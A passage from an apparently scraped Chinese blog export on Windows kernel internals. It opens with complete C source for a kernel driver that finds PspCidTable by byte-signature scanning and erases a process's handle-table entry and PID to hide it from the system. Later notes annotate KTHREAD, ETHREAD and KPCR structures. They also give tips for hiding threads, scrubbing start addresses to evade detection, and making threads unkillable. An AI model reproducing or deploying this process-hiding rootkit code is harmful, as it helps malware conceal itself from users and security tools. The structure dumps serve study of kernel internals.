SystemHandleInformation, SystemObjectInformation, SystemPageFileInformation, SystemVdmInstemulInformation, SystemVdmBopInformation, SystemFileCacheInformation, SystemPoolTagInformation, SystemInterruptInformation, SystemDpcBehaviorInformation, SystemFullMemoryInformation, SystemLoadGdiDriverInformation, SystemUnloadGdiDriverInformation, SystemTimeAdjustmentInformation, SystemSummaryMemoryInformation, SystemMirrorMemoryInformation, SystemPerformanceTraceInformation, SystemObsolete0, SystemExceptionInformation, SystemCrashDumpStateInformation, SystemKernelDebuggerInformation, SystemContextSwitchInformation, SystemRegistryQuotaInformation, SystemExtendServiceTableInformation, SystemPrioritySeperation, SystemVerifierAddDriverInformation, SystemVerifierRemoveDriverInformation, SystemProcessorIdleInformation, SystemLegacyDriverInformation, SystemCurrentTimeZoneInformation, SystemLookasideInformation, SystemTimeSlipNotification, SystemSessionCreate, SystemSessionDetach, SystemSessionInformation, SystemRangeStartInformation, SystemVerifierInformation, SystemVerifierThunkExtend, SystemSessionProcessInformation, SystemLoadGdiDriverInSystemSpace, SystemNumaProcessorMap, SystemPrefetcherInformation, SystemExtendedProcessInformation, SystemRecommendedSharedDataAlignment, SystemComPlusPackage, SystemNumaAvailableMemory, SystemProcessorPowerInformation, SystemEmulationBasicInformation, SystemEmulationProcessorInformation, SystemExtendedHandleInformation, SystemLostDelayedWriteInformation, SystemBigPoolInformation, SystemSessionPoolTagInformation, SystemSessionMappedViewInformation, SystemHotpatchInformation, SystemObjectSecurityMode, SystemWatchdogTimerHandler, SystemWatchdogTimerInformation, SystemLogicalProcessorInformation, SystemWow64SharedInformation, SystemRegisterFirmwareTableInformationHandler, SystemFirmwareTableInformation, SystemModuleInformationEx, SystemVerifierTriageInformation, SystemSuperfetchInformation, SystemMemoryListInformation, SystemFileCacheInformationEx, MaxSystemInfoClass // MaxSystemInfoClass should always be the last enum&#125; SYSTEM_INFORMATION_CLASS;typedef struct _RTL_PROCESS_MODULE_INFORMATION &#123; HANDLE Section; // Not filled in PVOID MappedBase; PVOID ImageBase; ULONG ImageSize; ULONG Flags; USHORT LoadOrderIndex; USHORT InitOrderIndex; USHORT LoadCount; USHORT OffsetToFileName; UCHAR FullPathName[256];&#125; RTL_PROCESS_MODULE_INFORMATION, *PRTL_PROCESS_MODULE_INFORMATION;typedef struct _RTL_PROCESS_MODULES &#123; ULONG NumberOfModules; RTL_PROCESS_MODULE_INFORMATION Modules[1];&#125; RTL_PROCESS_MODULES, *PRTL_PROCESS_MODULES;NTSTATUS ZwQuerySystemInformation(SYSTEM_INFORMATION_CLASS SystemInformationClass, PVOID SystemInformation, ULONG SystemInformationLength, PULONG ReturnLength);ULONG searchOtherCode(ULONG_PTR startAddr, ULONG_PTR endAddr, char* code, int offset); ProcessProtection.c 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879#include &quot;ProcessProtection.h&quot;#include &quot;Search.h&quot;PVOID GetPspCidTable()&#123; static PVOID scidTable = NULL; if (scidTable) return scidTable; UNICODE_STRING unName = &#123; 0 &#125;; RtlInitUnicodeString(&amp;unName, L&quot;PsLookupProcessByProcessId&quot;); PUCHAR startFunc = MmGetSystemRoutineAddress(&amp;unName); scidTable = (PVOID)searchOtherCode(startFunc, startFunc + 0x100, &quot;8B*****E8****8BF885FF74*8B1F&quot;, 2); if (scidTable) &#123; scidTable = **(PVOID ***)scidTable; &#125; return scidTable;&#125;ULONG_PTR GetExpLookupHandleTableEntry()&#123; static PVOID ExpLookupHandleTableEntry = NULL; if (ExpLookupHandleTableEntry) return ExpLookupHandleTableEntry; UNICODE_STRING unName = &#123; 0 &#125;; RtlInitUnicodeString(&amp;unName, L&quot;ExEnumHandleTable&quot;); PUCHAR startFunc = MmGetSystemRoutineAddress(&amp;unName); PUCHAR searchFunc = (PVOID)searchOtherCode(startFunc, startFunc + 0x200, &quot;FF75*8B4D*E8****8BF085F675*EB&quot;, 6); if (searchFunc) &#123; ExpLookupHandleTableEntry = (searchFunc + 5) + *(PULONG)(searchFunc + 1); &#125; return ExpLookupHandleTableEntry;&#125;PVOID MyExpLookupHandleTableEntry(HANDLE pid)&#123; // handleTable参数压栈至ecx, xxx压栈到edx, id参数push到栈上, 模拟__thiscall // x64 不需要这样来定义调用堆栈, 原函数并非3个参数, 原为2个参数 typedef PVOID (__fastcall * ExpLookupHandleTableEntryProc)(PVOID handleTable, ULONG xxx, HANDLE id); PVOID pspTable = GetPspCidTable(); ExpLookupHandleTableEntryProc func = (ExpLookupHandleTableEntryProc)GetExpLookupHandleTableEntry(); if (!pspTable || !func) return NULL; return func(pspTable, 0, pid);&#125;ULONG GetProcessIdOffset()&#123; UNICODE_STRING unName = &#123; 0 &#125;; RtlInitUnicodeString(&amp;unName, L&quot;PsGetProcessId&quot;); PUCHAR startFunc = MmGetSystemRoutineAddress(&amp;unName); return *(PULONG)(startFunc + 11);&#125;BOOLEAN ProcessProtection(HANDLE pid)&#123; PEPROCESS Process = NULL; NTSTATUS status = PsLookupProcessByProcessId(pid, &amp;Process); if (!NT_SUCCESS(status)) return FALSE; ObDereferenceObject(Process); PVOID pHandleEntry = MyExpLookupHandleTableEntry(pid); // 抹除相关信息（_HANDLE_TABLE_ENTRY） memset(pHandleEntry, 0, 8); // ULONG offset = GetProcessIdOffset(); *(PHANDLE)((PUCHAR)Process + 0xb4) = 0; return TRUE;&#125; Search.c 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311#include &quot;Search.h&quot;#include &lt;ntimage.h&gt;// 将字节转换成16进制UCHAR Char2Hex(UCHAR * szCh)&#123; unsigned char temp[2] = &#123; 0 &#125;; for (int i = 0; i &lt; 2; i++) &#123; if (szCh[i] &gt;= &#x27;0&#x27; &amp;&amp; szCh[i] &lt;= &#x27;9&#x27;) &#123; temp[i] = (szCh[i] - &#x27;0&#x27;); &#125; else if (szCh[i] &gt;= &#x27;A&#x27; &amp;&amp; szCh[i] &lt;= &#x27;F&#x27;) &#123; temp[i] = (szCh[i] - &#x27;A&#x27;) + 0xA; &#125; else if (szCh[i] &gt;= &#x27;a&#x27; &amp;&amp; szCh[i] &lt;= &#x27;f&#x27;) &#123; temp[i] = (szCh[i] - &#x27;a&#x27;) + 0xA; &#125; &#125; return ((temp[0] &lt;&lt; 4) &amp; 0xf0) | (temp[1] &amp; 0xf);&#125;// 初始化结构void initFindCodeStruct(PFindCode findCode, PCHAR code, ULONG_PTR offset, ULONG_PTR lastAddressOffset)&#123; memset(findCode, 0, sizeof(FindCode)); findCode-&gt;lastAddressOffset = lastAddressOffset; findCode-&gt;offset = offset; PCHAR pTemp = code; ULONG_PTR i = 0; for (i = 0; *pTemp != &#x27;\\0&#x27;; i++) &#123; if (*pTemp == &#x27;*&#x27; || *pTemp == &#x27;?&#x27;) &#123; findCode-&gt;code[i] = *pTemp; pTemp++; continue; &#125; findCode-&gt;code[i] = Char2Hex(pTemp); pTemp += 2; &#125; findCode-&gt;len = i;&#125;ULONG_PTR findAddressByCode(ULONG_PTR beginAddr, ULONG_PTR endAddr, PFindCode findCode, ULONG size)&#123; ULONG64 j = 0; LARGE_INTEGER rtna = &#123; 0 &#125;; for (ULONG_PTR i = beginAddr; i &lt;= endAddr; i++) &#123; if (!MmIsAddressValid((PVOID)i)) &#123; i = i &amp; (~0xfff) + PAGE_SIZE - 1; continue; &#125; for (j = 0; j &lt; size; j++) &#123; FindCode fc = findCode[j]; ULONG_PTR tempAddress = i; UCHAR * code = (UCHAR *)(tempAddress + fc.offset); BOOLEAN isFlags = FALSE; for (ULONG_PTR k = 0; k &lt; fc.len; k++) &#123; if (!MmIsAddressValid((PVOID)(code + k))) &#123; isFlags = TRUE; break; &#125; if (fc.code[k] == &#x27;*&#x27; || fc.code[k] == &#x27;?&#x27;) continue; if (code[k] != fc.code[k]) &#123; isFlags = TRUE; break; &#125; &#125; if (isFlags) break; &#125; if (j == size) &#123; rtna.QuadPart = i; rtna.LowPart += findCode[0].lastAddressOffset; break; &#125; &#125; return rtna.QuadPart;&#125;//ULONG_PTR findAddressByCode(ULONG_PTR beginAddr, ULONG_PTR endAddr, PFindCode findCode, ULONG numbers)//&#123;// ULONG64 j = 0;// LARGE_INTEGER rtna = &#123; 0 &#125;;//// for (ULONG_PTR i = beginAddr; i &lt;= endAddr; i++)// &#123;// if (!MmIsAddressValid((PVOID)i))// &#123;// i = i &amp; (~0xfff) + PAGE_SIZE - 1;// continue;// &#125;//////// for (j = 0; j &lt; numbers; j++)// &#123;// FindCode fc = findCode[j];// ULONG_PTR tempAddress = i;//// UCHAR * code = (UCHAR *)(tempAddress + fc.offset);// BOOLEAN isFlags = FALSE;//// for (ULONG_PTR k = 0; k &lt; fc.len; k++)// &#123;// if (!MmIsAddressValid((PVOID)(code + k)))// &#123;// isFlags = TRUE;// break;// &#125;//// if (fc.code[k] == &#x27;*&#x27; || fc.code[k] == &#x27;?&#x27;) continue;//// if (code[k] != fc.code[k])// &#123;// isFlags = TRUE;// break;// &#125;// &#125;//// if (isFlags) break;//// &#125;//// //找到了// if (j == numbers)// &#123;// rtna.QuadPart = i;// rtna.LowPart += findCode[0].lastAddressOffset;// break;// &#125;//// &#125;//// return rtna.QuadPart;//&#125;char * Char2Uper(char * wstr, BOOLEAN isAllocateMemory)&#123; char * ret = NULL; if (isAllocateMemory) &#123; int len = strlen(wstr) + 2; ret = ExAllocatePool(PagedPool, len); memset(ret, 0, len); memcpy(ret, wstr, len - 2); &#125; else &#123; ret = wstr; &#125; _strupr(ret); return ret;&#125;ULONG_PTR QueryModule(PUCHAR pModuleName, ULONG_PTR * pModuleSize)&#123; if (pModuleName == NULL) return 0; RTL_PROCESS_MODULES RtlModules = &#123; 0 &#125;; PRTL_PROCESS_MODULES pRtlModules = &amp;RtlModules; BOOLEAN bFlags = FALSE; // 测量长度 ULONG * ReturnLength = 0; // 需要申请内存的实际大小 NTSTATUS status = ZwQuerySystemInformation(SystemModuleInformation, pRtlModules, sizeof(RTL_PROCESS_MODULES), &amp;ReturnLength); // 判断长度不匹配 if (status == STATUS_INFO_LENGTH_MISMATCH) &#123; pRtlModules = ExAllocatePool(PagedPool, ReturnLength + sizeof(RTL_PROCESS_MODULES)); if (!pRtlModules) return 0; memset(pRtlModules, 0, ReturnLength + sizeof(RTL_PROCESS_MODULES)); status = ZwQuerySystemInformation(SystemModuleInformation, pRtlModules, ReturnLength + sizeof(RTL_PROCESS_MODULES), &amp;ReturnLength); if (!NT_SUCCESS(status)) &#123; ExFreePool(pRtlModules); return 0; &#125; bFlags = TRUE; &#125; PUCHAR pKernelModuleName = NULL; ULONG_PTR pModuleBase = 0; do &#123; if (_stricmp(pModuleName, &quot;ntkrnlpa.exe&quot;) == 0 || _stricmp(pModuleName, &quot;ntoskrnl.exe&quot;) == 0) &#123; PRTL_PROCESS_MODULE_INFORMATION pModuleInformation = &amp;pRtlModules-&gt;Modules[0]; pModuleBase = pModuleInformation-&gt;ImageBase; if (pModuleSize) *pModuleSize = pModuleInformation-&gt;ImageSize; break; &#125; pKernelModuleName = ExAllocatePool(PagedPool, strlen(pModuleName) + 1); memset(pKernelModuleName, 0, strlen(pModuleName) + 1); memcpy(pKernelModuleName, pModuleName, strlen(pModuleName)); _strupr(pKernelModuleName); for (int i = 0; i &lt; pRtlModules-&gt;NumberOfModules; i++) &#123; PRTL_PROCESS_MODULE_INFORMATION pModuleInformation = &amp;pRtlModules-&gt;Modules[i]; PUCHAR FullPathName = _strupr(pModuleInformation-&gt;FullPathName); DbgPrintEx(77, 0, &quot;BaseName = %s, FullName = %s\\r\\n&quot;, pModuleInformation-&gt;FullPathName + pModuleInformation-&gt;OffsetToFileName, pModuleInformation-&gt;FullPathName); if (strstr(FullPathName, pKernelModuleName)) &#123; pModuleBase = pModuleInformation-&gt;ImageBase; if (pModuleSize) *pModuleSize = pModuleInformation-&gt;ImageSize; break; &#125; &#125; &#125; while (0); if (pKernelModuleName) &#123; ExFreePool(pKernelModuleName); &#125; if (bFlags) &#123; ExFreePool(pRtlModules); &#125; return pModuleBase;&#125;////ULONG searchOtherCode(ULONG_PTR startAddr, ULONG_PTR endAddr, char* code, int offset)//&#123;// FindCode fc[1] = &#123; 0 &#125;;// initFindCodeStruct(&amp;fc[0], code, 0, offset);//// //SIZE_T moduleBase = 0;// //ULONG size = QueryModule(&quot;ntoskrnl.exe&quot;, &amp;moduleBase);//// ULONG_PTR func = findAddressByCode(startAddr, endAddr, fc, 1);// return func;//&#125;ULONG searchOtherCode(ULONG_PTR startAdd, ULONG_PTR endAddr, char * code, int offset)&#123; FindCode fs[1] = &#123; 0 &#125;; initFindCodeStruct(&amp;fs[0], code, 0, offset); ULONG_PTR func = findAddressByCode(startAdd, endAddr, fs, 1); return func;&#125;ULONG searchNtCode(char* code, int offset)&#123; FindCode fc[1] = &#123; 0 &#125;; initFindCodeStruct(&amp;fc[0], code, 0, offset); SIZE_T moduleBase = 0; ULONG size = QueryModule(&quot;ntoskrnl.exe&quot;, &amp;moduleBase); ULONG_PTR func = findAddressByCode(moduleBase, size + moduleBase, fc, 1); return func;&#125;ULONG searchCode(char * moduleName, char* segmentName, char* code, int offset)&#123; FindCode fc[1] = &#123; 0 &#125;; initFindCodeStruct(&amp;fc[0], code, 0, offset); SIZE_T moduleBase = 0; ULONG size = QueryModule(moduleName, &amp;moduleBase); if (!moduleBase) &#123; return 0; &#125; PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)moduleBase; PIMAGE_NT_HEADERS pNts = (PIMAGE_NT_HEADERS)(moduleBase + pDos-&gt;e_lfanew); PIMAGE_SECTION_HEADER pSection = IMAGE_FIRST_SECTION(pNts); PIMAGE_SECTION_HEADER pTemp = NULL; for (int i = 0; i &lt; pNts-&gt;FileHeader.NumberOfSections; i++) &#123; char bufName[9] = &#123; 0 &#125;; memcpy(bufName, pSection-&gt;Name, 8); if (_stricmp(bufName, segmentName) == 0) &#123; pTemp = pSection; break; &#125; pSection++; &#125; if (pTemp) &#123; moduleBase = pSection-&gt;VirtualAddress + moduleBase; size = pSection-&gt;SizeOfRawData; &#125; ULONG_PTR func = findAddressByCode(moduleBase, size + moduleBase, fc, 1); return func;&#125; DriverEntry.c 123456789101112131415161718192021222324#include &lt;ntifs.h&gt;#include &quot;ProcessProtection.h&quot;void DriverUnload(PDRIVER_OBJECT pDriver)&#123; DbgPrintEx(77, 0, &quot;[db]: DriverUnload Running\\r\\n&quot;);&#125;NTSTATUS DriverEntry(PDRIVER_OBJECT pDriver, PUNICODE_STRING pReg)&#123; DbgPrintEx(77, 0, &quot;[db]: DriverEntry Running\\r\\n&quot;); /*PVOID pspTable = GetPspCidTable(); ULONG_PTR funcAddr = GetExpLookupHandleTableEntry(); DbgPrintEx(77, 0, &quot;[db]: %x, %x\\r\\n&quot;, pspTable, funcAddr);*/ // PVOID pHandleEntry = MyExpLookupHandleTableEntry((HANDLE)3140); // DbgPrintEx(77, 0, &quot;[db]: %x\\r\\n&quot;, pHandleEntry); ProcessProtection((HANDLE)2932); pDriver-&gt;DriverUnload = DriverUnload; return STATUS_SUCCESS;&#125; vm3dmp.sys会导致蓝屏, 可摘除钩子","categories":[{"name":"Windows内核","slug":"Windows内核","permalink":"http://example.com/categories/Windows%E5%86%85%E6%A0%B8/"}],"tags":[{"name":"Windows内核","slug":"Windows内核","permalink":"http://example.com/tags/Windows%E5%86%85%E6%A0%B8/"}]},{"title":"Windows内核-线程","slug":"Windows内核-线程","date":"2024-11-17T14:56:33.000Z","updated":"2024-11-19T05:43:06.756Z","comments":true,"path":"2776887d.html","link":"","permalink":"http://example.com/2776887d.html","excerpt":"线程","text":"线程 知识点线程执行的必要条件 线程需要什么才能执行 必须有CR3指向的内存, 线程一定绑定在某个进程上; 如果是内核线程, 只有一个堆栈; PsCreateSystemThread如果不指定进程的情况下, 一定是system进程; 如果是普通的R3线程CreateThread, 会有两个堆栈（系统调用时会存在R3堆栈和R0堆栈）;普通线程是区分R0、R3的上下文环境的 R0下的上下文环境是Ktrap_frame（其中之一）;R3下的上下文环境描述是TEB, R0下上下文环境描述是E/KTHREAD; 线程KTHREAD内核态线程堆栈123+0x028 InitialStack : Ptr32 Void // 栈底+0x02c StackLimit : Ptr32 Void // ESP（切换线程恢复时使用）+0x030 KernelStack : Ptr32 Void // 栈顶 每个线程在创建堆栈的时候预留了0x29c的位置（包括trap_frame和浮点）, 想要求出真正的栈底需要加上0x29c; 在系统调用时trap_frame保存环境 结构原型 Priority字段在xp下就32个链表在WIN7之后不是32个链表, 每个核32个链表, 存在KPCR, 32个链表组成一个数组, 数字越大, 优先级越高; 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127kd&gt; dt _KTHREADntdll!_KTHREAD +0x000 Header : _DISPATCHER_HEADER // +0x010 CycleTime : Uint8B +0x018 HighCycleTime : Uint4B +0x020 QuantumTarget : Uint8B // 总耗时的时间碎片 +0x028 InitialStack : Ptr32 Void // 堆栈栈底 +0x02c StackLimit : Ptr32 Void // 堆栈栈顶 +0x030 KernelStack : Ptr32 Void // ESP +0x034 ThreadLock : Uint4B +0x038 WaitRegister : _KWAIT_STATUS_REGISTER +0x039 Running : UChar +0x03a Alerted : [2] UChar // 可警惕性 +0x03c KernelStackResident : Pos 0, 1 Bit // 堆栈拓展 +0x03c ReadyTransition : Pos 1, 1 Bit +0x03c ProcessReadyQueue : Pos 2, 1 Bit +0x03c WaitNext : Pos 3, 1 Bit +0x03c SystemAffinityActive : Pos 4, 1 Bit +0x03c Alertable : Pos 5, 1 Bit // 是否支持可被唤醒 +0x03c GdiFlushActive : Pos 6, 1 Bit // gdi是否刷新 +0x03c UserStackWalkActive : Pos 7, 1 Bit +0x03c ApcInterruptRequest : Pos 8, 1 Bit // 是否允许apc +0x03c ForceDeferSchedule : Pos 9, 1 Bit +0x03c QuantumEndMigrate : Pos 10, 1 Bit +0x03c UmsDirectedSwitchEnable : Pos 11, 1 Bit +0x03c TimerActive : Pos 12, 1 Bit +0x03c SystemThread : Pos 13, 1 Bit // 判断是否是内核线程（api：IoIsSystemThread） +0x03c Reserved : Pos 14, 18 Bits +0x03c MiscFlags : Int4B +0x040 ApcState : _KAPC_STATE // apc状态 kd&gt; dt _KAPC_STATE ntdll!_KAPC_STATE +0x000 ApcListHead : [2] _LIST_ENTRY // +0x010 Process : Ptr32 _KPROCESS // 当前线程的上下文环境是谁 +0x014 KernelApcInProgress : UChar +0x015 KernelApcPending : UChar +0x016 UserApcPending : UChar ---------------------------------------------------------- +0x040 ApcStateFill : [23] UChar +0x057 Priority : Char // 线程优先级的级别 +0x058 NextProcessor : Uint4B // 亲核性, 决定线程下一次运行在哪个核 +0x05c DeferredProcessor : Uint4B +0x060 ApcQueueLock : Uint4B +0x064 ContextSwitches : Uint4B // 线程切换次数 +0x068 State : UChar // 线程的状态 +0x069 NpxState : Char +0x06a WaitIrql : UChar +0x06b WaitMode : Char +0x06c WaitStatus : Int4B +0x070 WaitBlockList : Ptr32 _KWAIT_BLOCK +0x074 WaitListEntry : _LIST_ENTRY +0x074 SwapListEntry : _SINGLE_LIST_ENTRY +0x07c Queue : Ptr32 _KQUEUE // 队列 +0x080 WaitTime : Uint4B +0x084 KernelApcDisable : Int2B +0x086 SpecialApcDisable : Int2B +0x084 CombinedApcDisable : Uint4B +0x088 Teb : Ptr32 Void +0x090 Timer : _KTIMER // 定时器 +0x0b8 AutoAlignment : Pos 0, 1 Bit +0x0b8 DisableBoost : Pos 1, 1 Bit +0x0b8 EtwStackTraceApc1Inserted : Pos 2, 1 Bit +0x0b8 EtwStackTraceApc2Inserted : Pos 3, 1 Bit +0x0b8 CalloutActive : Pos 4, 1 Bit +0x0b8 ApcQueueable : Pos 5, 1 Bit +0x0b8 EnableStackSwap : Pos 6, 1 Bit +0x0b8 GuiThread : Pos 7, 1 Bit +0x0b8 UmsPerformingSyscall : Pos 8, 1 Bit +0x0b8 VdmSafe : Pos 9, 1 Bit +0x0b8 UmsDispatched : Pos 10, 1 Bit +0x0b8 ReservedFlags : Pos 11, 21 Bits +0x0b8 ThreadFlags : Int4B +0x0bc ServiceTable : Ptr32 Void +0x0c0 WaitBlock : [4] _KWAIT_BLOCK +0x120 QueueListEntry : _LIST_ENTRY +0x128 TrapFrame : Ptr32 _KTRAP_FRAME +0x12c FirstArgument : Ptr32 Void +0x130 CallbackStack : Ptr32 Void +0x130 CallbackDepth : Uint4B +0x134 ApcStateIndex : UChar +0x135 BasePriority : Char +0x136 PriorityDecrement : Char +0x136 ForegroundBoost : Pos 0, 4 Bits +0x136 UnusualBoost : Pos 4, 4 Bits +0x137 Preempted : UChar // 抢占 +0x138 AdjustReason : UChar +0x139 AdjustIncrement : Char +0x13a PreviousMode : Char +0x13b Saturation : Char +0x13c SystemCallNumber : Uint4B +0x140 FreezeCount : Uint4B +0x144 UserAffinity : _GROUP_AFFINITY +0x150 Process : Ptr32 _KPROCESS // 代表谁创建了这个线程 +0x154 Affinity : _GROUP_AFFINITY +0x160 IdealProcessor : Uint4B +0x164 UserIdealProcessor : Uint4B +0x168 ApcStatePointer : [2] Ptr32 _KAPC_STATE +0x170 SavedApcState : _KAPC_STATE +0x170 SavedApcStateFill : [23] UChar +0x187 WaitReason : UChar +0x188 SuspendCount : Char +0x189 Spare1 : Char +0x18a OtherPlatformFill : UChar +0x18c Win32Thread : Ptr32 Void +0x190 StackBase : Ptr32 Void +0x194 SuspendApc : _KAPC +0x194 SuspendApcFill0 : [1] UChar +0x195 ResourceIndex : UChar +0x194 SuspendApcFill1 : [3] UChar +0x197 QuantumReset : UChar +0x194 SuspendApcFill2 : [4] UChar +0x198 KernelTime : Uint4B +0x194 SuspendApcFill3 : [36] UChar +0x1b8 WaitPrcb : Ptr32 _KPRCB +0x194 SuspendApcFill4 : [40] UChar +0x1bc LegoData : Ptr32 Void +0x194 SuspendApcFill5 : [47] UChar +0x1c3 LargeStack : UChar +0x1c4 UserTime : Uint4B +0x1c8 SuspendSemaphore : _KSEMAPHORE +0x1c8 SuspendSemaphorefill : [20] UChar +0x1dc SListFaultCount : Uint4B +0x1e0 ThreadListEntry : _LIST_ENTRY // 线程链表, 对应KPROCESS中的ThreadListHead +0x1e8 MutantListHead : _LIST_ENTRY +0x1f0 SListFaultAddress : Ptr32 Void +0x1f4 ThreadCounters : Ptr32 _KTHREAD_COUNTERS +0x1f8 XStateSave : Ptr32 _XSTATE_SAVE ETHREAD 线程断链要断执行体的（ETHREAD）, 断完之后R3下通过API遍历线程是遍历不到的;隐藏线程的好处: 不PG; 防止别人搜索自己的代码; 当用系统取创建线程时将StartAddress和Win32StartAddress弄干净, 必须要指向一个其他模块, 而不是自己的模块, 否则会被查出来; 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091kd&gt; dt _ETHREADntdll!_ETHREAD +0x000 Tcb : _KTHREAD +0x200 CreateTime : _LARGE_INTEGER +0x208 ExitTime : _LARGE_INTEGER +0x208 KeyedWaitChain : _LIST_ENTRY +0x210 ExitStatus : Int4B +0x214 PostBlockList : _LIST_ENTRY +0x214 ForwardLinkShadow : Ptr32 Void +0x218 StartAddress : Ptr32 Void // 线程的入口点 +0x21c TerminationPort : Ptr32 _TERMINATION_PORT +0x21c ReaperLink : Ptr32 _ETHREAD +0x21c KeyedWaitValue : Ptr32 Void +0x220 ActiveTimerListLock : Uint4B +0x224 ActiveTimerListHead : _LIST_ENTRY +0x22c Cid : _CLIENT_ID +0x234 KeyedWaitSemaphore : _KSEMAPHORE +0x234 AlpcWaitSemaphore : _KSEMAPHORE +0x248 ClientSecurity : _PS_CLIENT_SECURITY_CONTEXT +0x24c IrpList : _LIST_ENTRY +0x254 TopLevelIrp : Uint4B +0x258 DeviceToVerify : Ptr32 _DEVICE_OBJECT +0x25c CpuQuotaApc : Ptr32 _PSP_CPU_QUOTA_APC +0x260 Win32StartAddress : Ptr32 Void // ui线程入口点 +0x264 LegacyPowerObject : Ptr32 Void +0x268 ThreadListEntry : _LIST_ENTRY +0x270 RundownProtect : _EX_RUNDOWN_REF +0x274 ThreadLock : _EX_PUSH_LOCK +0x278 ReadClusterSize : Uint4B +0x27c MmLockOrdering : Int4B +0x280 CrossThreadFlags : Uint4B +0x280 Terminated : Pos 0, 1 Bit +0x280 ThreadInserted : Pos 1, 1 Bit +0x280 HideFromDebugger : Pos 2, 1 Bit +0x280 ActiveImpersonationInfo : Pos 3, 1 Bit +0x280 Reserved : Pos 4, 1 Bit +0x280 HardErrorsAreDisabled : Pos 5, 1 Bit +0x280 BreakOnTermination : Pos 6, 1 Bit // 置为1，别人无法关闭线程, 关闭就会蓝屏 +0x280 SkipCreationMsg : Pos 7, 1 Bit +0x280 SkipTerminationMsg : Pos 8, 1 Bit +0x280 CopyTokenOnOpen : Pos 9, 1 Bit +0x280 ThreadIoPriority : Pos 10, 3 Bits +0x280 ThreadPagePriority : Pos 13, 3 Bits +0x280 RundownFail : Pos 16, 1 Bit +0x280 NeedsWorkingSetAging : Pos 17, 1 Bit +0x284 SameThreadPassiveFlags : Uint4B +0x284 ActiveExWorker : Pos 0, 1 Bit +0x284 ExWorkerCanWaitUser : Pos 1, 1 Bit +0x284 MemoryMaker : Pos 2, 1 Bit +0x284 ClonedThread : Pos 3, 1 Bit +0x284 KeyedEventInUse : Pos 4, 1 Bit +0x284 RateApcState : Pos 5, 2 Bits +0x284 SelfTerminate : Pos 7, 1 Bit +0x288 SameThreadApcFlags : Uint4B +0x288 Spare : Pos 0, 1 Bit +0x288 StartAddressInvalid : Pos 1, 1 Bit +0x288 EtwPageFaultCalloutActive : Pos 2, 1 Bit +0x288 OwnsProcessWorkingSetExclusive : Pos 3, 1 Bit +0x288 OwnsProcessWorkingSetShared : Pos 4, 1 Bit +0x288 OwnsSystemCacheWorkingSetExclusive : Pos 5, 1 Bit +0x288 OwnsSystemCacheWorkingSetShared : Pos 6, 1 Bit +0x288 OwnsSessionWorkingSetExclusive : Pos 7, 1 Bit +0x289 OwnsSessionWorkingSetShared : Pos 0, 1 Bit +0x289 OwnsProcessAddressSpaceExclusive : Pos 1, 1 Bit +0x289 OwnsProcessAddressSpaceShared : Pos 2, 1 Bit +0x289 SuppressSymbolLoad : Pos 3, 1 Bit +0x289 Prefetching : Pos 4, 1 Bit +0x289 OwnsDynamicMemoryShared : Pos 5, 1 Bit +0x289 OwnsChangeControlAreaExclusive : Pos 6, 1 Bit +0x289 OwnsChangeControlAreaShared : Pos 7, 1 Bit +0x28a OwnsPagedPoolWorkingSetExclusive : Pos 0, 1 Bit +0x28a OwnsPagedPoolWorkingSetShared : Pos 1, 1 Bit +0x28a OwnsSystemPtesWorkingSetExclusive : Pos 2, 1 Bit +0x28a OwnsSystemPtesWorkingSetShared : Pos 3, 1 Bit +0x28a TrimTrigger : Pos 4, 2 Bits +0x28a Spare1 : Pos 6, 2 Bits +0x28b PriorityRegionActive : UChar +0x28c CacheManagerActive : UChar +0x28d DisablePageFaultClustering : UChar +0x28e ActiveFaultCount : UChar +0x28f LockOrderState : UChar +0x290 AlpcMessageId : Uint4B +0x294 AlpcMessage : Ptr32 Void +0x294 AlpcReceiveAttributeSet : Uint4B +0x298 AlpcWaitListEntry : _LIST_ENTRY +0x2a0 CacheManagerCount : Uint4B +0x2a4 IoBoostCount : Uint4B +0x2a8 IrpListLock : Uint4B +0x2ac ReservedForSynchTracking : Ptr32 Void +0x2b0 CmCallbackListHead : _SINGLE_LIST_ENTRY +0x2b4 KernelStackReference : Uint4B 线程查找线程主动切换状态1234567891011typedef enum _KTHREAD_STATE &#123; Initialized, // 初始化 Ready, // 就绪 Running, // 运行状态 Standby, // 备用状态 Terminated, // 结束 Waiting, // 等待 Transition, // 转化 DeferredReady, // 延时就绪 GateWait // 未使用&#125; KTHREAD_STATE 线程被动切换","categories":[{"name":"Windows内核","slug":"Windows内核","permalink":"http://example.com/categories/Windows%E5%86%85%E6%A0%B8/"}],"tags":[{"name":"Windows内核","slug":"Windows内核","permalink":"http://example.com/tags/Windows%E5%86%85%E6%A0%B8/"}]},{"title":"Windows内核-KPCR","slug":"Windows内核-KPCR","date":"2024-11-15T01:31:59.000Z","updated":"2024-11-18T02:44:23.310Z","comments":true,"path":"bd2c183d.html","link":"","permalink":"http://example.com/bd2c183d.html","excerpt":"KPCR_进程","text":"KPCR_进程 知识点KPCR 结构 FS&#x3D;0x30, 在内核中的时候就是指向KPCR;FS&#x3D;0x3b, 在应用层的时候指向当前线程的TEB; 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647kd&gt; dt _KPCRntdll!_KPCR +0x000 NtTib : _NT_TIB kd&gt; dt _NT_TIB ntdll!_NT_TIB +0x000 ExceptionList : Ptr32 _EXCEPTION_REGISTRATION_RECORD +0x004 StackBase : Ptr32 Void // 动态, 记录当前线程堆栈 +0x008 StackLimit : Ptr32 Void // 动态, 记录当前线程堆栈 +0x00c SubSystemTib : Ptr32 Void +0x010 FiberData : Ptr32 Void +0x010 Version : Uint4B +0x014 ArbitraryUserPointer : Ptr32 Void +0x018 Self : Ptr32 _NT_TIB // 指向_NT_TIB本身, 